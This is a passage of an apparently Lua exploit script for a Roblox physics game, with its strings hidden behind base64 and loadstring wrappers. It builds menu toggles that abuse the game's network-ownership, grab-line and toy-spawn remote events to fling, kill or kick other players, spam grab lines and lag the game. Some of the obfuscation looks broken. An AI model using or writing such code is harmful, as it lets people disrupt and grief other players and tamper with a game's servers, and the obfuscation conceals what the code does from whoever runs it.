	Name = loadstring(base64decode("QW50aSBQYWludA=="))(),
        Flag = loadstring(base64decode("QW50aSBQYWludA=="))(),
	Default = false,
	Callback = function(state)
        SetToggleState(loadstring(base64decode("QW50aSBQYWludA=="))(), state)
		if state then
			deleteAllPaintParts()
			watchNewPaintParts()
			setTouchQuery(false)
		else
			restorePaintParts()
			disconnectWatchers()
			setTouchQuery(true)
		end
	end
})

do

    local defenseEnabled = false
    local defenseConnection = nil
    local defenseMode = loadstring(base64decode("Rmxpbmc="))()
    local crazyline = false
    local crazylineTask = nil

    local GrabEvents = game:GetService(loadstring(base64decode("UmVwbGljYXRlZFN0b3JhZ2U="))()):WaitForChild(loadstring(base64decode("R3JhYkV2ZW50cw=="))())
    local SetNetworkOwner = GrabEvents:WaitForChild(loadstring(base64decode("U2V0TmV0d29ya093bmVy"))())
    local DestroyGrabLine = GrabEvents:FindFirstChild(loadstring(base64decode("RGVzdHJveUdyYWJMaW5l"))())
    local CreateGrabEvent = GrabEvents:FindFirstChild(loadstring(base64decode("Q3JlYXRlR3JhYkxpbmU="))())
    local Debris = game:GetService(loadstring(base64decode("RGVicmlz"))())

    local function getAttacker()
        local char = LocalPlayer.Character
        if not char or not char:FindFirstChild(loadstring(base64decode("SGVhZA=="))()) then
            return nil
        end
        local owner = char.Head:FindFirstChild(loadstring(base64decode("UGFydE93bmVy"))())
        if not owner or not owner:IsA(loadstring(base64decode("U3RyaW5nVmFsdWU="))()) then
            return nil
        end
        return game:GetService(loadstring(base64decode("UGxheWVycw=="))()):FindFirstChild(owner.Value)
    end

    local function performFling(attacker)
        if not attacker or not attacker.Character then return end
        local root = attacker.Character:FindFirstChild(loadstring(base64decode("SHVtYW5vaWRSb290UGFydA=="))())
        if not root then return end
        pcall(function()
            SetNetworkOwner:FireServer(root, root.CFrame)
            if DestroyGrabLine then
                DestroyGrabLine:FireServer(root)
            end
            local away = (root.Position - LocalPlayer.Character.HumanoidRootPart.Position).Unit
            away = Vector3.new(away.X, 0, away.Z) * 90000
            local bv = Instance.new(loadstring(base64decode("Qm9keVZlbG9jaXR5"))())
            bv.Name = loadstring(base64decode("UmlubmVnYW5GbGluZw=="))()
            bv.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
            bv.Velocity = away
            bv.P = 12500
            bv.Parent = root
            Debris:AddItem(bv, 0.01)
        end)
    end

    local function performKill(attacker)
        if not attacker or not attacker.Character then return end
        local root = attacker.Character:FindFirstChild(loadstring(base64decode("SHVtYW5vaWRSb290UGFydA=="))())
        if not root then return end
        pcall(function()
            SetNetworkOwner:FireServer(root, root.CFrame)
            if DestroyGrabLine then
                DestroyGrabLine:FireServer(root)
            end
            local away = (root.Position - LocalPlayer.Character.HumanoidRootPart.Position).Unit
            away = Vector3.new(away.X, 0, away.Z) * 99999999999999
            local bv = Instance.new(loadstring(base64decode("Qm9keVZlbG9jaXR5"))())
            bv.Name = loadstring(base64decode("UmlubmVnYW5GbGluZw=="))()
            bv.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
            bv.Velocity = away
            bv.P = 12500
            bv.Parent = root
            Debris:AddItem(bv, 0.01)
        end)
    end

    local function performHeaven(attacker)
        if not attacker or not attacker.Character then return end
        local root = attacker.Character:FindFirstChild(loadstring(base64decode("SHVtYW5vaWRSb290UGFydA=="))())
        if not root then return end
        pcall(function()
            SetNetworkOwner:FireServer(root, root.CFrame)
            if DestroyGrabLine then
                DestroyGrabLine:FireServer(root)
            end
            root.CFrame = CFrame.new(0, 200, 0)
            local bv = Instance.new(loadstring(base64decode("Qm9keVZlbG9jaXR5"))())
            bv.Name = loadstring(base64decode("UmlubmVnYW5IZWF2ZW4="))()
            bv.MaxForce = Vector3.new(0, math.huge, 0)
            bv.Velocity = Vector3.new(0, 200, 0)
            bv.P = 12500
            bv.Parent = root
            Debris:AddItem(bv, 0.01)
        end)
    end

    local function performKick(attacker)
        if not attacker or not attacker.Character then return end
        local root = attacker.Character:FindFirstChild(loadstring(base64decode("SHVtYW5vaWRSb290UGFydA=="))())
        if not root then return end
        pcall(function()
            SetNetworkOwner:FireServer(root, root.CFrame)
            if DestroyGrabLine then
                DestroyGrabLine:FireServer(root)
            end
            root.CFrame = CFrame.new(0, 999999999999, 0)
            local bv = Instance.new(loadstring(base64decode("Qm9keVZlbG9jaXR5"))())
            bv.Name = loadstring(base64decode("UmlubmVnYW5IZWF2ZW4="))()
            bv.MaxForce = Vector3.new(0, math.huge, 0)
            bv.Velocity = Vector3.new(0, 99999999999999, 0)
            bv.P = 12500
            bv.Parent = root
            Debris:AddItem(bv, 0.01)
        end)
    end

    local function performRagdoll(attacker)
        if not attacker or not attacker.Character then return end
        local root = attacker.Character:FindFirstChild(loadstring(base64decode("SHVtYW5vaWRSb290UGFydA=="))())
        if not root then return end
        pcall(function()
            SetNetworkOwner:FireServer(root, root.CFrame)
            if DestroyGrabLine then
                DestroyGrabLine:FireServer(root)
            end
            local bv = Instance.new(loadstring(base64decode("Qm9keVZlbG9jaXR5"))())
            bv.Name = loadstring(base64decode("UmlubmVnYW5TcHk="))()
            bv.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
            bv.Velocity = Vector3.new(0, -20, 0)
            bv.P = 12500
            bv.Parent = root
            Debris:AddItem(bv, 0.01)
        end)
    end

    local function performHell(attacker)
        if not attacker or not attacker.Character then return end
        local root = attacker.Character:FindFirstChild(loadstring(base64decode("SHVtYW5vaWRSb290UGFydA=="))())
        if not root then return end
        pcall(function()
            SetNetworkOwner:FireServer(root, root.CFrame)
            if DestroyGrabLine then
                DestroyGrabLine:FireServer(root)
            end
            for _, part in ipairs(attacker.Character:GetDescendants()) do
                if part:IsA(loadstring(base64decode("QmFzZVBhcnQ="))()) and not part.Anchored then
                    part.CanCollide = false
                end
            end
            local bv = Instance.new(loadstring(base64decode("Qm9keVZlbG9jaXR5"))())
            bv.Name = loadstring(base64decode("UmlubmVnYW5TcHk="))()
            bv.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
            bv.Velocity = Vector3.new(0, -100000000, 0)
            bv.P = 12500
            bv.Parent = root
            local noclipConnection
            noclipConnection = game:GetService(loadstring(base64decode("UnVuU2VydmljZQ=="))()).Heartbeat:Connect(function()
                if not attacker.Character or not attacker.Character.Parent then
                    noclipConnection:Disconnect()
                    return
                end
                for _, part in ipairs(attacker.Character:GetDescendants()) do
                    if part:IsA(loadstring(base64decode("QmFzZVBhcnQ="))()) and not part.Anchored then
                        part.CanCollide = false
                    end
                end
            end)
            task.delay(0.01, function()
                if noclipConnection then
                    noclipConnection:Disconnect()
                end
            end)
            Debris:AddItem(bv, 0.01)
        end)
    end

    local function performChina(attacker)
        if not attacker or not attacker.Character then return end
        local root = attacker.Character:FindFirstChild(loadstring(base64decode("SHVtYW5vaWRSb290UGFydA=="))())
        if not root then return end
        pcall(function()
            SetNetworkOwner:FireServer(root, root.CFrame)
            if DestroyGrabLine then
                DestroyGrabLine:FireServer(root)
            end
            root.CFrame = CFrame.new(591, 153, -101)
        end)
    end

    local function performSpamGrabLines(attacker)
        while crazyline do
            pcall(function()
                local char = LocalPlayer.Character
                if char then
                    local head = char:FindFirstChild(loadstring(base64decode("SGVhZA=="))())
                    if head then
                        local owner = head:FindFirstChild(loadstring(base64decode("UGFydE93bmVy"))())
                        if owner and owner:IsA(loadstring(base64decode("U3RyaW5nVmFsdWU="))()) then
                            local attacker = game:GetService(loadstring(base64decode("UGxheWVycw=="))()):FindFirstChild(owner.Value)
                            if attacker and attacker.Character then
                                local attackerHead = attacker.Character:FindFirstChild(loadstring(base64decode("SGVhZA=="))())
                                local attackerHRP = attacker.Character:FindFirstChild(loadstring(base64decode("SHVtYW5vaWRSb290UGFydA=="))())
                                if attackerHead and attackerHRP then
                                    for xVec0uwV = 1, 10 do
                                        pcall(function()
                                            CreateGrabEvent:FireServer(attackerHead, attackerHead.CFrame)
                                        end)
                                    end
                                    for xVec0uwV = 1, 10 do
                                        pcall(function()
                                            CreateGrabEvent:FireServer(attackerHRP, attackerHRP.CFrame)
                                        end)
                                    end
                                end
                            end
                        end
                    end
                end
            end)
            task.wait(0.01)
        end
    end

    local function startDefense()
        if defenseConnection then
            return
        end
        defenseConnection = game:GetService(loadstring(base64decode("UnVuU2VydmljZQ=="))()).Heartbeat:Connect(function()
            if not defenseEnabled then
                return
            end
            local attacker = getAttacker()
            if not attacker then
                return
            end
            if defenseMode == loadstring(base64decode("Rmxpbmc="))() then
                performFling(attacker)
            elseif defenseMode == loadstring(base64decode("S2lsbA=="))() then
                performKill(attacker)
            elseif defenseMode == loadstring(base64decode("U2VuZCB0byBIZWF2ZW4="))() then
                performHeaven(attacker)
            elseif defenseMode == loadstring(base64decode("S2ljaw=="))() then
                performKick(attacker)
            elseif defenseMode == loadstring(base64decode("UmFnZG9sbA=="))() then
                performRagdoll(attacker)
            elseif defenseMode == loadstring(base64decode("SGVsbA=="))() then
                performHell(attacker)
            elseif defenseMode == loadstring(base64decode("Q2hpbmE="))() then
                performChina(attacker)
            elseif defenseMode == loadstring(base64decode("R3JhYkxpbmU="))() then
                if not crazylineTask then
                    crazyline = true
                    crazylineTask = task.spawn(performSpamGrabLines)
                end
            end
        end)
    end

    local function stopDefense()
        if defenseConnection then
            defenseConnection:Disconnect()
            defenseConnection = nil
        end
        crazyline = false
        if crazylineTask then
            task.cancel(crazylineTask)
            crazylineTask = nil
        end
        for _, plr in ipairs(game:GetService(loadstring(base64decode("UGxheWVycw=="))()):GetPlayers()) do
            local char = plr.Character
            if char then
                for _, obj in ipairs(char:GetDescendants()) do
                    if obj:IsA(loadstring(base64decode("Qm9keVZlbG9jaXR5"))()) and (obj.Name == loadstring(base64decode("UmlubmVnYW5GbGluZw=="))() or obj.Name == loadstring(base64decode("UmlubmVnYW5IZWF2ZW4="))() or obj.Name == loadstring(base64decode("UmlubmVnYW5TcHk="))()) then
                        obj:Destroy()
                    end
                end
            end
        end
    end

    LocalPlayer.CharacterAdded:Connect(function()
        if defenseEnabled then
            task.wait(1)
            startDefense()
        end
    end)

    DefenseGroup:CreateToggle({
        Name = loadstring(base64decode("Q291bnRlciBBdHRhY2tz"))(),
        Default = false,
        Callback = function(Value)
            defenseEnabled = Value
            if Value then
                startDefense()
            else
                stopDefense()
            end
        end
    })

    DefenseGroup:CreateDropdown({
        Name = loadstring(base64decode("QXR0YWNrIE1vZGU="))(),
        Items = {loadstring(base64decode("Rmxpbmc="))(), loadstring(base64decode("S2lsbA=="))(), loadstring(base64decode("U2VuZCB0byBIZWF2ZW4="))(), loadstring(base64decode("S2ljaw=="))(), loadstring(base64decode("UmFnZG9sbA=="))(), loadstring(base64decode("SGVsbA=="))(), loadstring(base64decode("Q2hpbmE="))(), loadstring(base64decode("R3JhYkxpbmU="))()},
        Default = loadstring(base64decode("Rmxpbmc="))(),
        Callback = function(Value)
            defenseMode = Value
        end
    })
end

local platformTPToggle = false
local platformTPActive = false
local platformPart = nil
local oldPlatformPos = nil

local function SetupPlatform()
    if not platformPart then
        platformPart = Instance.new(loadstring(base64decode("UGFydA=="))(), workspace)
        platformPart.Name = loadstring(base64decode("U2t5QmFzZQ=="))()
        platformPart.Anchored = true
        platformPart.Size = Vector3.new(1500, 2, 1500)
        platformPart.CFrame = CFrame.new(0, 1000000, 0)
        workspace.FallenPartsDestroyHeight = -9999999
    end
end

DefenseExtra:CreateToggle({
    Name = loadstring(base64decode("RW5hYmxlIFBsYXRmb3JtIFRQ"))(),
    Flag = loadstring(base64decode("UGxhdGZvcm1UUFRvZ2dsZQ=="))(),
    Default = false,
    Callback = function(Value)
        SetToggleState(loadstring(base64decode("UGxhdGZvcm1UUFRvZ2dsZQ=="))(), Value)
        platformTPToggle = Value
        if Value then
            SetupPlatform()
        else
            platformTPActive = false
        end
    end
})

DefenseExtra:CreateKeybind({
    Name = loadstring(base64decode("UGxhdGZvcm0gVFAgRXhlY3V0ZQ=="))(),
    Flag = loadstring(base64decode("UGxhdGZvcm1UUEtleQ=="))(),
    Default = loadstring(base64decode("WA=="))(),
    Callback = function()
        if not platformTPToggle then return end
        
        local char = Player.Character
        local root = char and char:FindFirstChild(loadstring(base64decode("SHVtYW5vaWRSb290UGFydA=="))())
        if not root then return end

        platformTPActive = not platformTPActive

        if platformTPActive then
            oldPlatformPos = root.CFrame
            root.CFrame = platformPart.CFrame + Vector3.new(0, 5, 0)
            root.AssemblyLinearVelocity = Vector3.zero
            root.AssemblyAngularVelocity = Vector3.zero
        else
            if oldPlatformPos then
                root.CFrame = oldPlatformPos
            end
        end
    end
})

DefenseExtra:CreateButton({
    Name = loadstring(base64decode("RGVsZXRlIExlZ3M="))(),
        Flag = loadstring(base64decode("RGVsZXRlIExlZ3M="))(),
    Callback = function()
        local char = Player.Character
        if not char then return end
        if char:FindFirstChild(loadstring(base64decode("TGVmdCBMZWc="))()) and char:FindFirstChild(loadstring(base64decode("UmlnaHQgTGVn"))()) then
            local ll = char:FindFirstChild(loadstring(base64decode("TGVmdCBMZWc="))())
            local rl = char:FindFirstChild(loadstring(base64decode("UmlnaHQgTGVn"))())
            local void = workspace.FallenPartsDestroyHeight
            local pos = char.Torso.CFrame
            workspace.FallenPartsDestroyHeight = -100
            ReplicatedStorage.CharacterEvents.RagdollRemote:FireServer(char.HumanoidRootPart, 2)
            task.wait(0.5)
            rl.CFrame = CFrame.new(0, -10000, 0)
            ll.CFrame = CFrame.new(0, -10000, 0)
            task.wait(0.3)
            char.Torso.CFrame = CFrame.new(0, -9970, 0)
            task.wait(0.5)
            char.Torso.CFrame = pos
            task.wait(0.5)
            workspace.FallenPartsDestroyHeight = void
            task.spawn(function()
                if not char:FindFirstChild(loadstring(base64decode("TGVmdCBMZWc="))()) and not char:FindFirstChild(loadstring(base64decode("UmlnaHQgTGVn"))()) then
                    while task.wait() do
                        if Player.PlayerGui.ControlsGui.PCFrame.Stand.Visible == false then
                            char.Humanoid.HipHeight = 2
                        else
                            char.Humanoid.HipHeight = 0
                        end
                    end
                end
            end)
        end
    end
})

do

    local ToyList = {
        [loadstring(base64decode("Q29jb251dA=="))()] = loadstring(base64decode("Rm9vZENvY29udXQ="))(),
        [loadstring(base64decode("QmFuYW5h"))()] = loadstring(base64decode("Rm9vZEJhbmFuYQ=="))(),
        [loadstring(base64decode("RnJpZXM="))()] = loadstring(base64decode("Rm9vZEZyZW5jaEZyaWVz"))(),
        [loadstring(base64decode("TWVhdFN0aWNr"))()] = loadstring(base64decode("Rm9vZE1lYXRTdGljaw=="))(),
        [loadstring(base64decode("UG9vcA=="))()] = loadstring(base64decode("UG9vcFBpbGU="))(),
        [loadstring(base64decode("RG9udXQ="))()] = loadstring(base64decode("Rm9vZERvbnV0"))(),
        [loadstring(base64decode("Q2FrZQ=="))()] = loadstring(base64decode("Rm9vZENha2VQaW5r"))(),
        [loadstring(base64decode("QnVyZ2Vy"))()] = loadstring(base64decode("Rm9vZEhhbWJ1cmdlcg=="))(),
        [loadstring(base64decode("UGl6emE="))()] = loadstring(base64decode("Rm9vZFBpenphQ2hlZXNl"))(),
        [loadstring(base64decode("SG90ZG9n"))()] = loadstring(base64decode("Rm9vZEhvdGRvZw=="))(),
        [loadstring(base64decode("TXVzaHJvb20="))()] = loadstring(base64decode("Rm9vZE11c2hyb29tUG9pc29u"))(),
        [loadstring(base64decode("QmFuam8="))()] = loadstring(base64decode("SW5zdHJ1bWVudEd1aXRhckJhbmpv"))(),
        [loadstring(base64decode("VmlvbGlu"))()] = loadstring(base64decode("SW5zdHJ1bWVudEd1aXRhclZpb2xpbg=="))(),
        [loadstring(base64decode("VWt1bGVsZQ=="))()] = loadstring(base64decode("SW5zdHJ1bWVudEd1aXRhclVrdWxlbGU="))(),
        [loadstring(base64decode("U2F4"))()] = loadstring(base64decode("SW5zdHJ1bWVudFdvb2R3aW5kU2F4b3Bob25l"))(),
        [loadstring(base64decode("VnV2dXplbGE="))()] = loadstring(base64decode("SW5zdHJ1bWVudEJyYXNzVnV2dXplbGE="))(),
        [loadstring(base64decode("Qm9uZ29z"))()] = loadstring(base64decode("SW5zdHJ1bWVudERydW1Cb25nb3M="))(),
        [loadstring(base64decode("TWlj"))()] = loadstring(base64decode("SW5zdHJ1bWVudFZvaWNlTWljcm9waG9uZQ=="))(),
        [loadstring(base64decode("UGVwcGVyb25p"))()] = loadstring(base64decode("Rm9vZFBpenphUGVwcGVyb25p"))(),
        [loadstring(base64decode("UGlhbm8="))()] = loadstring(base64decode("SW5zdHJ1bWVudFBpYW5vTWVsb2RpY2E="))(),
        [loadstring(base64decode("QnJlYWQ="))()] = loadstring(base64decode("Rm9vZEJyZWFk"))(),
        [loadstring(base64decode("RWdn"))()] = loadstring(base64decode("Rm9vZERpcHB5RWdn"))(),
        [loadstring(base64decode("TWF5bw=="))()] = loadstring(base64decode("Rm9vZE1heW9ubmFpc2U="))(),
        [loadstring(base64decode("V2hpdGVNdWc="))()] = loadstring(base64decode("Q3VwTXVnV2hpdGU="))(),
        [loadstring(base64decode("T2NhcmluYQ=="))()] = loadstring(base64decode("SW5zdHJ1bWVudFdvb2R3aW5kT2NhcmluYQ=="))(),
        [loadstring(base64decode("U3BhcmtsZVBvb3A="))()] = loadstring(base64decode("UG9vcFBpbGVTcGFya2xl"))(),
        [loadstring(base64decode("QnJvd25NdWc="))()] = loadstring(base64decode("Q3VwTXVnQnJvd24="))(),
        [loadstring(base64decode("VHJ1bXBldA=="))()] = loadstring(base64decode("SW5zdHJ1bWVudEJyYXNzVHJ1bXBldA=="))(),
        [loadstring(base64decode("U25hcmU="))()] = loadstring(base64decode("SW5zdHJ1bWVudERydW1TbmFyZQ=="))(),
        [loadstring(base64decode("THlyZQ=="))()] = loadstring(base64decode("SW5zdHJ1bWVudEd1aXRhckx5cmU="))(),
    }

    local DropdownValues = {}
    for shortName, _ in pairs(ToyList) do
        table.insert(DropdownValues, shortName)
    end
    table.sort(DropdownValues)

    local SelectedToy = ToyList[loadstring(base64decode("QnVyZ2Vy"))()]
    local instantLagActive = false
    local instantLagTask = nil

    function fixEndGrab()
        pcall(function()
            local grabEvents = ReplicatedStorage:WaitForChild(loadstring(base64decode("R3JhYkV2ZW50cw=="))())
            local existing = grabEvents:FindFirstChild(loadstring(base64decode("RW5kR3JhYkVhcmx5"))())
            if existing then existing:Destroy() end
            local s = Instance.new(loadstring(base64decode("UmVtb3RlRXZlbnQ="))())
            s.Name = loadstring(base64decode("RW5kR3JhYkVhcmx5"))()
            s.Parent = grabEvents
            s.OnClientEvent:Connect(function() end)
        end)
    end

    fixEndGrab()

    DefenseExtra:CreateDropdown({
        Name = loadstring(base64decode("U2VsZWN0IElucHV0IExhZyBUb3k="))(),
        Items = DropdownValues,
        Default = loadstring(base64decode("QnVyZ2Vy"))(),
        Callback = function(Value)
            SelectedToy = ToyList[Value]
        end
    })

    DefenseExtra:CreateToggle({
        Name = loadstring(base64decode("QW50aSBJbnB1dCBMYWc="))(),
        Default = false,
        Callback = function(Value)
            instantLagActive = Value

            if instantLagTask then
                task.cancel(instantLagTask)
                instantLagTask = nil
            end

            if Value then
                instantLagTask = task.spawn(function()
                    local plr = LocalPlayer
                    local RS = ReplicatedStorage
                    local SpawnRemote = RS:WaitForChild(loadstring(base64decode("TWVudVRveXM="))()):WaitForChild(loadstring(base64decode("U3Bhd25Ub3lSZW1vdGVGdW5jdGlvbg=="))())
                    local DestroyToy = RS:WaitForChild(loadstring(base64decode("TWVudVRveXM="))()):WaitForChild(loadstring(base64decode("RGVzdHJveVRveQ=="))())
                    local SetNetOwner = RS:WaitForChild(loadstring(base64decode("R3JhYkV2ZW50cw=="))()):WaitForChild(loadstring(base64decode("U2V0TmV0d29ya093bmVy"))())
                    local GrabEvents = RS:WaitForChild(loadstring(base64decode("R3JhYkV2ZW50cw=="))())

                    local HoldDuration = 0.02
                    local CycleSpeed = 0.02

                    while instantLagActive do
                        local char = plr.Character
                        local hrp = char and char:FindFirstChild(loadstring(base64decode("SHVtYW5vaWRSb290UGFydA=="))())

                        if hrp then
                            local toysFolder = workspace:FindFirstChild(plr.Name..loadstring(base64decode("U3Bhd25lZEluVG95cw=="))())
                            local name = SelectedToy
                            local item = toysFolder and toysFolder:FindFirstChild(name)

                            if not item or not item.Parent then
                                task.spawn(function()
                                    pcall(function()
                                        SpawnRemote:InvokeServer(name, hrp.CFrame * CFrame.new(0, -12, 0), Vector3.zero)
                                    end)
                                end)
                                task.wait(0.1)
                            else
                                local holdPart = item:FindFirstChild(loadstring(base64decode("SG9sZFBhcnQ="))())
                                if holdPart then
                                    for _, v in pairs(item:GetDescendants()) do
                                        if v:IsA(loadstring(base64decode("QmFzZVBhcnQ="))()) then
                                            v.CanCollide = false
                                            v.Massless = true
                                        end
                                    end

                                    task.spawn(function()
                                        pcall(function()
                                            holdPart.HoldItemRemoteFunction:InvokeServer(item, char)
                                        end)
                                    end)

                                    task.wait(HoldDuration)

                                    task.spawn(function()
                                        pcall(function()
                                            holdPart.DropItemRemoteFunction:InvokeServer(
                                                item,
                                                CFrame.new(0, 5000, 0),
                                                Vector3.zero
                                            )
                                        end)
                                    end)
                                end
                            end
                        end
                        task.wait(CycleSpeed)
                    end
                end)
            end
        end
    })
end

DefenseExtra:CreateToggle({
        Name = loadstring(base64decode("QnJlYWsgUGNsZA=="))(),
        Default = false,
        Callback = function(Value)
            local hkExpectDeath = false
            local hkSalmonList = {}
            hkSalmonList[LocalPlayer.UserId] = true
            
            local function hkApplySalmon(char)
                if not char then return end
                local newHum = char:WaitForChild(loadstring(base64decode("SHVtYW5vaWQ="))(), 5)
                if not newHum then return end
                if hkSalmonList[LocalPlayer.UserId] and not hkExpectDeath then
                    hkExpectDeath = true
                    newHum:ChangeState(Enum.HumanoidStateType.Dead)
                else
                    hkExpectDeath = false
                end
            end
            
            LocalPlayer.CharacterAdded:Connect(function(char)
                hkApplySalmon(char)
            end)
            
            hkSalmonList[LocalPlayer.UserId] = Value and true or nil
            if Value then
                hkExpectDeath = false
                local char = LocalPlayer.Character
                local hum = char and char:FindFirstChildOfClass(loadstring(base64decode("SHVtYW5vaWQ="))())
                if hum then hum.Health = 0 end
            end
        end
    })


do
    Players = game:GetService(loadstring(base64decode("UGxheWVycw=="))())
    RS = game:GetService(loadstring(base64decode("UmVwbGljYXRlZFN0b3JhZ2U="))())
    RunService = game:GetService(loadstring(base64decode("UnVuU2VydmljZQ=="))())
    plr = Players.LocalPlayer

    -- State
    AntiKickItemActive = false
    MyPCLD = nil
    pcldConn = nil
    ToyList = {
        [loadstring(base64decode("SmFwYW5lc2UgTGFudGVybg=="))()] = loadstring(base64decode("SmFwYW5lc2VMYW50ZXJu"))(),
        [loadstring(base64decode("U3ByYXkgQ2Fu"))()]        = loadstring(base64decode("U3ByYXlDYW5XRA=="))(),
        [loadstring(base64decode("U3Bvb2t5IENhbmRsZQ=="))()]    = loadstring(base64decode("U3Bvb2t5Q2FuZGxlMQ=="))(),
    }

    DropdownValues = {}
    for shortName, _ in pairs(ToyList) do
        table.insert(DropdownValues, shortName)
    end
    table.sort(DropdownValues)

    local SelectedToy = ToyList[loadstring(base64decode("U3Bvb2t5IENhbmRsZQ=="))()] or ToyList[DropdownValues[1]]

    DefenseExtra:CreateDropdown({
        Name = loadstring(base64decode("YW50aSBraWNrIGl0ZW0="))(),
        Flag = loadstring(base64decode("SW5wdXQgTGFnIEl0ZW0="))(),
        Items = DropdownValues,
        Default = loadstring(base64decode("U3Bvb2t5IENhbmRsZQ=="))(), 
        Callback = function(Value)
            SelectedToy = ToyList[Value]
        end
    })

    local function GetMagnitude(Part1, Part2)
        return (Part1.Position - Part2.Position).Magnitude
    end

    local function FWD(parent, part, timeOffset)
        return parent:FindFirstChild(part) or parent:WaitForChild(part, timeOffset or 1)
    end

    local function CFP(parent, part)
        return parent:FindFirstChild(part) ~= nil  
    end

    local function CheckNetworkOwnerOnPart(Part) 
        local po = Part:FindFirstChild(loadstring(base64decode("UGFydE93bmVy"))())
        return po and po.Value == plr.Name
    end

    local function sno(part)
        pcall(function()
            local grabEvents = RS:FindFirstChild(loadstring(base64decode("R3JhYkV2ZW50cw=="))())
            local setNetOwner = grabEvents and grabEvents:FindFirstChild(loadstring(base64decode("U2V0TmV0d29ya093bmVy"))())
            if setNetOwner then
                setNetOwner:FireServer(part, part.CFrame)
            end
        end)
    end

    local function CheckForHome()
        local plotItems = workspace:FindFirstChild(loadstring(base64decode("UGxvdEl0ZW1z"))())
        local plots = workspace:FindFirstChild(loadstring(base64decode("UGxvdHM="))())
        
        if plots and plotItems then
            for xVec0uwV = 1, 5 do 
                local Plot = plots:FindFirstChild(loadstring(base64decode("UGxvdA=="))()..xVec0uwV)
                if Plot then
                    local sign = Plot:FindFirstChild(loadstring(base64decode("UGxvdFNpZ24="))())
                    local owners = sign and sign:FindFirstChild(loadstring(base64decode("VGhpc1Bsb3RzT3duZXJz"))())
                    if owners then
                        for _,v in pairs(owners:GetChildren()) do 
                            if v.Value == plr.Name then 
                                return plotItems:FindFirstChild(loadstring(base64decode("UGxvdA=="))()..xVec0uwV)
                            end
                        end
                    end
                end
            end
        end
        return nil
    end

    local function SpawnToy(ToyName)
        local InPlot = plr:FindFirstChild(loadstring(base64decode("SW5QbG90"))())
        local InOwnedPlot = plr:FindFirstChild(loadstring(base64decode("SW5Pd25lZFBsb3Q="))())
        local CanSpawnToy = plr:FindFirstChild(loadstring(base64decode("Q2FuU3Bhd25Ub3k="))())
        local inv = workspace:FindFirstChild(plr.Name..loadstring(base64decode("U3Bhd25lZEluVG95cw=="))())

        if InPlot and InPlot.Value and InOwnedPlot and not InOwnedPlot.Value then 
            InPlot:GetPropertyChangedSignal(loadstring(base64decode("VmFsdWU="))()):Wait()
        end 
        if CanSpawnToy and not CanSpawnToy.Value then 
            CanSpawnToy:GetPropertyChangedSignal(loadstring(base64decode("VmFsdWU="))()):Wait()
        end

        local hrp = plr.Character and plr.Character:FindFirstChild(loadstring(base64decode("SHVtYW5vaWRSb290UGFydA=="))())
        if not hrp then return nil end

        local SpawnCF = (MyPCLD or hrp).CFrame * CFrame.new(0, 14, 20)
        local Container = (InOwnedPlot and InOwnedPlot.Value) and CheckForHome() or inv
        if not Container then return nil end

        local spawnedObject = nil
        local connection
        connection = Container.ChildAdded:Connect(function(child)
            if child.Name == ToyName then
                spawnedObject = child
            end
        end)

        task.spawn(function()
            pcall(function()
                local menuToys = RS:FindFirstChild(loadstring(base64decode("TWVudVRveXM="))())
                local spawnRemote = menuToys and menuToys:FindFirstChild(loadstring(base64decode("U3Bhd25Ub3lSZW1vdGVGdW5jdGlvbg=="))())
                if spawnRemote then
                    spawnRemote:InvokeServer(ToyName, SpawnCF, Vector3.zero)
                end
            end)
        end)

        local start = tick()
        repeat task.wait() until spawnedObject or (tick() - start) > 2.5

        if connection then connection:Disconnect() end
        return spawnedObject
    end

    local function FindPCLD(hrp)
        if pcldConn then pcldConn:Disconnect() end
        MyPCLD = nil
        pcldConn = RunService.Heartbeat:Connect(function()
            if MyPCLD or not hrp or not hrp.Parent then 
                if pcldConn then pcldConn:Disconnect() pcldConn = nil end
                return
            end
            for _, v in pairs(workspace:GetChildren()) do 
                if v.Name == loadstring(base64decode("UGxheWVyQ2hhcmFjdGVyTG9jYXRpb25EZXRlY3Rvcg=="))() and v:IsA(loadstring(base64decode("QmFzZVBhcnQ="))()) then
                    if GetMagnitude(v, hrp) <= 2 then 
                        MyPCLD = v
                        break
                    end
                end
            end
        end)
    end

do


local AutoDeleteLegsActive = false
local DeleteLegsConnection = nil

local function PerformLegDeletion(char)
    -- Wait a brief moment to ensure the character is fully loaded
    task.wait(0.5) 
    
    if not AutoDeleteLegsActive then return end
    
    local hrp = char:FindFirstChild(loadstring(base64decode("SHVtYW5vaWRSb290UGFydA=="))())
    local hum = char:FindFirstChild(loadstring(base64decode("SHVtYW5vaWQ="))())
    local torso = char:FindFirstChild(loadstring(base64decode("VG9yc28="))())
    local ll = char:FindFirstChild(loadstring(base64decode("TGVmdCBMZWc="))())
    local rl = char:FindFirstChild(loadstring(base64decode("UmlnaHQgTGVn"))())
    
    if hrp and hum and torso and ll and rl then
        local void = workspace.FallenPartsDestroyHeight
        local pos = torso.CFrame
        
        workspace.FallenPartsDestroyHeight = -100
        ReplicatedStorage.CharacterEvents.RagdollRemote:FireServer(hrp, 2)
        task.wait(0.5)
        
        if ll and rl then
            rl.CFrame = CFrame.new(0, -10000, 0)
            ll.CFrame = CFrame.new(0, -10000, 0)
        end
        
        task.wait(0.3)
        if torso then torso.CFrame = CFrame.new(0, -9970, 0) end
        
        task.wait(0.5)
        if torso then torso.CFrame = pos end
        
        task.wait(0.5)
        workspace.FallenPartsDestroyHeight = void
        
        -- Safe HipHeight adjustment loop
        task.spawn(function()
            while AutoDeleteLegsActive and char.Parent and hum.Health > 0 and not char:FindFirstChild(loadstring(base64decode("TGVmdCBMZWc="))()) and not char:FindFirstChild(loadstring(base64decode("UmlnaHQgTGVn"))()) do
                pcall(function()
                    local controls = Player.PlayerGui:FindFirstChild(loadstring(base64decode("Q29udHJvbHNHdWk="))())
                    if controls and controls:FindFirstChild(loadstring(base64decode("UENGcmFtZQ=="))()) and controls.PCFrame:FindFirstChild(loadstring(base64decode("U3RhbmQ="))()) then
                        if controls.PCFrame.Stand.Visible == false then
                            hum.HipHeight = 2
                        else
                            hum.HipHeight = 0
                        end
                    end
                end)
                task.wait()
            end
        end)
    end
end

    -- =========================================================================
    -- ANTI-KICK ITEM TOGGLE
    -- =========================================================================
    DefenseExtra:CreateToggle({
        Name = loadstring(base64decode("QW50aSBLaWNrIFtJVEVNXQ=="))(),
        Flag = loadstring(base64decode("QW50aUtpY2tJdGVtRmxhZw=="))(),
        Default = false,
        Callback = function(Val)
